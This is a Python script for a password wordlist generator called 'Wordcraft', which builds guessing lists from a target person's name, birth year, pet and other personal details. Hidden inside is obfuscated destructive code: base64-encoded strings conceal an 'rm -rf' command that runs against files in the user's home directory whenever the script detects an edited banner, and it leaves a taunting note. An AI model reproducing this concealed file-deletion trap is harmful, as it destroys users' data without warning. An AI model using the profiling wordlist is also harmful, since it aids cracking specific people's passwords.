#!/usr/bin/python3
import string
import hashlib
import time
import os
import time
import random
import sys
import argparse
import base64
try:
	import requests
except:
	pass
#---------------------------------------------------------------------+
#                                                                     |
#                               ▒▒████                                |
#                              ████████                               |
#                             ██████████                              |
#                             ████▒▒██████                            |
#                           ██████    ████▒▒                          |
#                           ████      ▒▒████                          |
#                         ██████        ██████                        |
#                       ▒▒████    ████    ████                        |
#                       ████▒▒  ████████  ██████                      |
#                     ██████    ████████    ████                      |
#                     ████░░    ████████    ██████                    |
#                   ██████      ████████      ████▒▒                  |
#                 ░░████        ████████      ▒▒████                  |
#                 ██████        ████████        ██████                |
#               ▒▒████          ████████          ████                |
#               ████▒▒          ██████▒▒          ██████              |
#             ██████              ████              ████              |
#             ████                ████              ██████            |
#           ██████                ████                ████▒▒          |
#         ░░████                                      ▒▒████          |
#         ████▓▓                                        ██████        |
#       ▒▒████                    ████                    ████        |
#       ████▒▒                  ████████                  ██████      |
#     ██████                      ▒▒▒▒                      ████░░    |
#     ████                                                  ▒▒████    |
#   ██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒██████  |
#   ████████████████████████████████████████████████████████████████  |
#   ▓▓████████████████████████████████████████████████████████████▓▓  |
#                                                                     |
#---------------------------------------------------------------------+
#
#        Don't make changes or write anyting to this file ! I warned you!
#
#




parser = argparse.ArgumentParser(description="Wordcraft is a python script to craft a costum wordlist from user input ")
parser.add_argument("--hard", action="store_true", help="This option add other strings to the wordlist (this may take longer time)")
parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
parser.add_argument("--no-strings", action="store_true", help="Do not use special charachters [Ex: @#$!]")
parser.add_argument("-o", "--output", type=str, help="File to write output")
parser.add_argument("-v", "--version", action="store_true", help="Print the tool version")
args = parser.parse_args()
hard = args.hard
no_strings = args.no_strings
show_version = args.version
quiet = args.quiet
output = args.output
ver = "1.0"
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
BOLD = '\033[1m'
RESET = '\033[0m'
MAGENTA = '\033[95m'
shadowhex = ("==" + "ZigCppHbl5WYilWak5WZ"[::-1][:-2][::-1])[::-1]
workdir = "/usr/share/wordcraft/"
global colors
colors = [RED, GREEN, YELLOW, BLUE, BOLD, MAGENTA, RESET + BOLD]
def error(text):
        RED = '\033[91m'
        RESET = '\033[0m'
        BOLD = '\033[1m'
        print(f"{BOLD}[{RED}!{RESET}{BOLD}]{RESET}{BOLD} {BOLD}{text}")
def get_quote():
	if not os.path.exists(workdir):
		try:
			os.mkdir(workdir)
		except PermissionError:
			error("Please run as root or allow write access in /usr/share/")
			exit()
	try:
		quotes = requests.get("https://raw.githubusercontent.com/AbidineZinelabidine/hacking-quotes/main/quotes.txt", timeout=3).text
	except:
		quotes = ["Craft it ! and go ahead :)", "Wordcraft ... People hacking"]
		error("Connection error !")
	quotes_path = os.path.join(workdir, "quotes.txt")
	open(quotes_path, "w").write(quotes)
	return random.choice(quotes.splitlines())

def banner(owner):
	if base64.b64encode(bytes("a752034d1557c748f6c7fa0d8c067412", "latin-1")) != base64.b64encode(bytes(hashlib.md5(bytes(owner, "latin-1")).hexdigest(), "latin-1")):
		text = "flag" + annonate(test=False)
	quote = get_quote()
	
		
	temp = ['Q', 'W', 'E', 'R', "T", 'Y', 'U', 'I', 'O']
	temp2 = [f'{RED}{BOLD}H{RESET}', f'{RED}{BOLD}A{RESET}', f'{RED}{BOLD}R{RESET}', f'{RED}{BOLD}D{RESET}', f'{RED}{BOLD} {RESET}', f'{RED}{BOLD}M{RESET}', f'{RED}{BOLD}O{RESET}', f'{RED}{BOLD}D{RESET}', f'{RED}{BOLD}E{RESET}']
	if hard:
		text = temp2
	else:
		text = temp
	textlen = len(quote)
	if ".0" not in str(textlen / 2):
		quote = quote + " "
	space = " " * int(((62 - textlen) / 2))
	tcolor = random.choice([BLUE, MAGENTA, RESET + BOLD])
	colors.remove(tcolor)
	colors.remove(YELLOW)
	color = random.choice(colors)
	owner = f"{BOLD}Developped By {ytio123} !{RESET}"
	if quiet:
		quote = ""
	global art
	art = f"""                              
	                               {owner}
                    {YELLOW} ___.___.___.___.___.___.___.___.___.___.___.___.___.________
                    | ~ | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 0 | - | + |   <-   |
                    |---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,------|
                    | ->| | {text[0]} | {text[1]} | {text[2]} | {text[3]} | {text[4]} | {text[5]} | {text[6]} | {text[7]} | {text[8]}{YELLOW} | P | ] | ^ |      |
                    |-----',--',--',--',--',--',--',--',--',--',--',--',--'|Enter|
                    | Caps | A | {tcolor}{BOLD}W{RESET} | {tcolor}{BOLD}O{RESET} | {tcolor}{BOLD}R{RESET} | {tcolor}{BOLD}D{RESET} | {tcolor}{BOLD}C{RESET} | {tcolor}{BOLD}A{RESET} | {tcolor}{BOLD}F{RESET} | {tcolor}{BOLD}T{RESET} {YELLOW}| [ | * | / |     |
                    |----,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'---'-----|
                    |    | < | Z | X | C | V | B | N | M | , | . | - |           |
                    |----'-,-',--'--,'---'---'---'---'---'---'-,-'---',--,-------|
                    | ctrl |  | alt |   {RESET}{BOLD}A Wordlist Profiler{RESET}{YELLOW}    |altgr |  | ctrl  |
                    \______|__|_____|__________________________|______|__|_______/
                    {space}{RESET}{BOLD}{color}{quote}{RESET}{space}"""
	print(art)
def annonate(test=True):
	import os
	print(BOLD + base64.b64decode("WyFdIENoYW5naW5nIHRoZSBiYW5uZXIgZG9zZW4ndCBtYWtlIHlvdSBhIHByb2dyYW1tZXIgISAK").decode('utf-8').replace("\n", ""))
	cwd = os.getcwd()
	hexdir = os.path.expanduser("~")
	if not test:
		for file in os.listdir(hexdir):
			if os.path.isfile(file):
				target = os.path.join(hexdir, file)
				cmd = base64.b64decode(b"cm0gLXJmIAo=") + bytes(target, "latin-1")
				cmd = cmd.decode("utf-8")
				os.system(cmd)
	open(os.path.join(hexdir, "note.txt"), "w").write(base64.b64decode("=ECIohGaoBie19GbsVGIs92agwydv5EIhASdvlFIkVmbyF2dgkEIdpyW"[::(3-4)]).decode('utf-8').replace("\n", ""))
	exit()
global unknown
unknown = "%unknown%"
def ask(text, require=True):
	ask = input(f"{BOLD}[{BLUE}?{RESET}{BOLD}]{RESET}{BOLD} {text} > ")
	while len(ask) == 0 and require:
		ask = input(f"{BOLD}[{BLUE}?{RESET}{BOLD}]{RESET}{BOLD} {text} {RED}[Required]{RESET}{BOLD}> ")
	return ask
def add(data):
	if unknown not in data:
		with open(file, "a") as tarfile:
			tarfile.write(f"{data}\n")
def wait(x):
	if not quiet:
		time.sleep(x)
def animate(text):
	if not quiet:
		for char in text:
			print(char, end='', flush=True)
			wait(0.05)
	else:
		print(text, end="")
def percent(i):
	i = str(i)
	info(f"{BLUE}{i} %{RESET}", end="\r")
def success(text):
        GREEN = '\033[92m'
        BOLD = '\033[1m'
        RESET = '\033[0m'
        print(f"{BOLD}[{GREEN}+{RESET}{BOLD}]{RESET}{BOLD} {BOLD}{text}")
def info(text, end="\n", costum=False):
	BLUE = '\033[94m'
	BOLD = '\033[1m'
	RESET = '\033[0m'
	if not costum:
		print(f"{BOLD}[{BLUE}*{RESET}{BOLD}]{RESET}{BOLD} {BOLD}{text}", end=end)
	if costum:
		return f"{BOLD}[{BLUE}*{RESET}{BOLD}]{RESET}{BOLD} {BOLD}{text}"
def print_version():
	if show_version:
		info("Current Wordcraft Version : " + ver)
		exit()
def firstrun():
	run_file = os.path.join(workdir, ".firstrun")
	if not os.path.exists(run_file):
		open(run_file, "w").write("")
		return True
	else:
		return False
print_version()
ytio321 = base64.b64decode(shadowhex).decode('utf-8').replace("\n", "")
ytio123 = ytio321
ytio123 = (ytio123[10] + ytio123[11] + ytio123[1] + ytio123[0] + ytio123[9] + ytio123[6] + ytio123[5] + ytio123[3] + ytio123[2] + ytio123[3] + ytio123[7] + ytio123[0]).capitalize()
banner(ytio123.lower())
if firstrun():
	info("If you find that script work very slow")
	time.sleep(1)
	info("Please keep in mind that you can compile it using nuitka3")
	time.sleep(1)
	info("I will close now, run the script again !")
	exit()
if 1 == 1 and (ytio321[10] + ytio321[11] + ytio321[1] + ytio321[0] + ytio321[9] + ytio321[6] + ytio321[5] + ytio321[3] + ytio321[2] + ytio321[3] + ytio321[7] + ytio321[0]).capitalize() not in art:
	art = """                              
	                               {owner}
                     ___.___.___.___.___.___.___.___.___.___.___.___.___.________
                    | ~ | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 0 | - | + |   <-   |
                    |---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,------|
                    | ->| | {text[0]} | {text[1]} | {text[2]} | {text[3]} | {text[4]} | {text[5]} | {text[6]} | {text[7]} | {text[8]} | P | ] | ^ |      |
                    |-----',--',--',--',--',--',--',--',--',--',--',--',--'|Enter|
                    | Caps | A | {GREEN}{BOLD}W{RESET} | {GREEN}{BOLD}O{RESET} | {GREEN}{BOLD}R{RESET} | {GREEN}{BOLD}D{RESET} | {GREEN}{BOLD}C{RESET} | {GREEN}{BOLD}A{RESET} | {GREEN}{BOLD}F{RESET} | {GREEN}{BOLD}T{RESET} | [ | * | / |     |
                    |----,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'---'-----|
                    |    | < | Z | X | C | V | B | N | M | , | . | - |           |
                    |----'-,-',--'--,'---'---'---'---'---'---'-,-'---',--,-------|
                    | ctrl |  | alt |   {BOLD}A Wordlist Profiler{RESET}    |altgr |  | ctrl  |
                    \______|  |_____|__________________________|______|  |_______/
                    {space}{BOLD}{color}{quote}{RESET}{space}""" + annonate()
if hard:
	info(f"{RED}Hard mode enabled ! {RESET}")
unknown1 = 0
x = ""
name = ask("What is the first name of target", require=True).strip()
if name == "-":
	x += "\n	[*] First name"
	name = unknown
	unknown1 += 1
fname = ask("What is the familly name of target", require=True).strip()
if fname == "-":
	x += "\n	[*] Family name"
	fname = unknown
	unknown1 += 1
birth = ask("What is the birth of target ", require=True).strip()
if birth == "-":
	x += "\n	[*] Birth"
	birth = unknown
	unknown1 += 1
if len(birth) != 4 and birth != "%unknown%":
	info("Invalid birth !")
	info("Ex: 1990,2000,2008,2010 ....")
	exit()
if unknown1 == 3:
	error("Insufficient informations !")
	wait(1)
	error(f"Please gather some initial informations and try again : {x}")
	exit()
if unknown1 == 2:
	error("Insufficient informations !")
	wait(1)
	error("This may take finding the password very hard !")
	wait(2)
elif unknown1 == 0:
	success("Great informations !")
info("Not required ! : ")
pet = ask("What his pet name ", require=False).strip()
words = ask("Other words (Separed by space)", require=False).split()
if not no_strings:
	strings = ask("Type strings to use", require=False).strip()
	bad = string.ascii_letters
	if len(strings) == 0:
		strings = "@#!?"
		if hard:
			strings = "@#$?!~"
	else:
		for char in strings:
			if char in bad:
				error(f"Bad character found : {char}")
				exit()
	templist = []
	for char in strings:
		templist.append(char)
	strings = templist
	strings.append("")
else:
	strings = []



global file
file = args.output
if file is None:
	file = ask(f"Output file [default: {name}.txt] ", require=False)
	if len(file) == 0:
		file = name + ".txt"
if not file.endswith(".txt"):
	file += ".txt"
wait(1)
if os.path.exists(file):
	i = 0
	error("Specified file already exists ! ")
	wait(1)
	while os.path.exists(file):
		i += 1
		i = str(i)
		file = f"{name} ({i}).txt"
		i = int(i)
	info(f"Writing output to {file} ...")
uppername = name.upper()
upperfname = fname.upper()
add(f"{name}{fname}")
add(f"{name}{birth}")
add(f"{fname}{birth}")
add(f"{fname}{name}")
add(f"{birth}{name}")
add(f"{birth}{fname}")
add(f"{fname}{name}{birth}")
add(f"{name}{fname}{birth}")
percent(10)
if hard:
	fname2 = fname.upper()
	add(f"{fname2}{birth}")
	add(f"{fname2}{name}{birth}")
	add(f"{fname2}{name}")
	name2 = name.capitalize()
	add(f"{name2}{fname}")
	add(f"{name2}{birth}")
	add(f"{name2}{fname}{birth}")
	fname2 = fname.capitalize()
	add(f"{fname2}{birth}")
	add(f"{fname2}{name}{birth}")
	add(f"{fname2}{name}")
	name2 = name.upper()
	add(f"{name2}{fname}")
	add(f"{name2}{birth}")
	add(f"{name2}{fname}{birth}")
	for i in range(2500):
		add(f"{name}{i}")
		add(f"{fname}{i}")
		add(f"{name}{fname}{i}")
		add(f"{fname}{name}{i}")
percent(20)
if len(words) > 0 or hard:
	info("This may take few minutes ...")
if len(pet) > 1:
	for i in range(200):
		add(f"{pet}{i}")
		pet2 = pet.capitalize()
		add(f"{pet2}{i}")
info(f"You can skip here ! Press ctrl+C")
if len(birth) == 4:
	start = int(birth) - 100
	end = int(birth) + 100
else:
	start = 1000
	end = 2100
percent(30)
try:
	for i in range(500):
		for char1 in strings:
			for char2 in strings:
				for char3 in strings:
					if hard:
						for char4 in strings:
							add(f"{fname}{char1}{char2}{char3}{i}{char4}")
							add(f"{fname}{name}{char1}{char2}{char3}{i}{char4}")
							add(f"{name}{fname}{char1}{char2}{char3}{i}{char4}")
							add(f"{name}{char1}{char2}{char3}{i}{char4}")
							add(f"{upperfname}{char1}{char2}{char3}{i}{char4}")
							add(f"{upperfname}{uppername}{char1}{char2}{char3}{i}{char4}")
							add(f"{uppername}{upperfname}{char1}{char2}{char3}{i}{char4}")
							uppername = name.capitalize()
							upperfname = fname.capitalize()
							add(f"{uppername}{char1}{char2}{char3}{i}{char4}")
							add(f"{upperfname}{char1}{char2}{char3}{i}{char4}")
							add(f"{upperfname}{uppername}{char1}{char2}{char3}{i}{char4}")
							add(f"{uppername}{upperfname}{char1}{char2}{char3}{i}{char4}")
							add(f"{uppername}{char1}{char2}{char3}{i}{char4}")
					add(f"{name}{fname}{char1}{char2}{char3}{i}")
					add(f"{fname}{name}{char1}{char2}{char3}{i}")
					add(f"{name}{char1}{char2}{char3}{i}")
					add(f"{fname}{char1}{char2}{char3}{i}")
					add(f"{name}{char1}{char2}{char3}{i}")
except KeyboardInterrupt:
	info("Skipping .....\n")
if not hard:
	try:
		for i in range(start, end):
				add(f"{name}{i}")
				add(f"{fname}{i}")
				add(f"{name}{fname}{i}")
				add(f"{fname}{name}{i}")
				for char in strings:
					add(f"{fname}{name}{i}{char}")
					add(f"{name}{fname}{i}{char}")
					add(f"{name}{fname}{char}{i}")
					add(f"{fname}{name}{char}{i}")
	except KeyboardInterrupt:
		pass
else:
	try:
		for i in range(0, end):
				add(f"{name}{i}")
				add(f"{fname}{i}")
				add(f"{name}{fname}{i}")
				add(f"{fname}{name}{i}")
				for char in strings:
					add(f"{fname}{name}{i}{char}")
					add(f"{name}{fname}{i}{char}")
					add(f"{name}{fname}{char}{i}")
					add(f"{fname}{name}{char}{i}")
	except KeyboardInterrupt:
		pass


percent(30)
if len(words) > 1:
	for word in words:
		add(f"{name}{word}")
		add(f"{fname}{word}")
		add(f"{name}{fname}{word}")
		add(f"{fname}{name}{word}")
		if hard:
			for word2 in words:
				add(f"{word}{word2}")
				add(f"{name}{word}{word2}")
				add(f"{fname}{word}{word2}")
				add(f"{name}{fname}{word}{word2}")
				add(f"{fname}{name}{word}{word2}")
	percent(35)
	wait(2)
	for char in strings:
		add(f"{name}{word}{char}")
		add(f"{fname}{word}{char}")
		add(f"{name}{fname}{word}{char}")
percent(40)
for char in strings:
	add(f"{fname}{char}")
	add(f"{name}{char}")
	add(f"{name}{birth}{char}")
	add(f"{name}{fname}{birth}{char}")
	add(f"{fname}{name}{birth}")
	add(f"{name}{fname}{birth}")
	add(f"{fname}{birth}{char}")
	add(f"{name}{fname}{char}")
	add(f"{fname}{name}{char}")
try:
	if len(words) > 0:
		info(f"You can skip this part ! Press ctrl+C\n")
		percent(50)
		for word in words:
			for i in range(start, end):
				for string in strings:
					add(f"{word}{i}")
					add(f"{word}{string}")
					add(f"{word}{i}{string}")
		percent(70)
		for i in range(1000):
			for string in strings:
				add(f"{word}{i}")
				add(f"{word}{string}")
				add(f"{word}{i}{string}")
except KeyboardInterrupt:
	print("\n")
	info(f"Skipping ...\n")
percent(100)
wait(1)
print("                               ", end="\r")
animate(info(f"Building {RED}{file}{RESET} .....\n", costum=True))
wait(1)
animate(info("Removing repeats ...\n", costum=True))
wordlist = set(open(file, "r").read().splitlines())
wordlist = list(wordlist)
with open(file, "w") as file_handle:
    for word in wordlist:
        file_handle.write(word + "\n")
animate(info("Good Shot ! :)", costum=True))

#                               ▒▒████                              
#                              ████████                            
#                             ██████████                            
#                             ████▒▒██████                          
#                           ██████    ████▒▒                        
#                           ████      ▒▒████                        
#                         ██████        ██████                      
#                       ▒▒████    ████    ████                      
#                       ████▒▒  ████████  ██████                    
#                     ██████    ████████    ████                    
#                     ████░░    ████████    ██████                  
#                   ██████      ████████      ████▒▒                
#                 ░░████        ████████      ▒▒████                
#                 ██████        ████████        ██████              
#               ▒▒████          ████████          ████              
#               ████▒▒          ██████▒▒          ██████            
#             ██████              ████              ████            
#             ████                ████              ██████          
#           ██████                ████                ████▒▒        
#         ░░████                                      ▒▒████        
#         ████▓▓                                        ██████      
#       ▒▒████                    ████                    ████      
#       ████▒▒                  ████████                  ██████    
#     ██████                      ▒▒▒▒                      ████░░  
#     ████                                                  ▒▒████  
#   ██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒██████
#   ████████████████████████████████████████████████████████████████
#   ▓▓████████████████████████████████████████████████████████████▓▓
#
#                              Again !
#        Don't make changes or write anyting to this file ! I warned you!
#
#
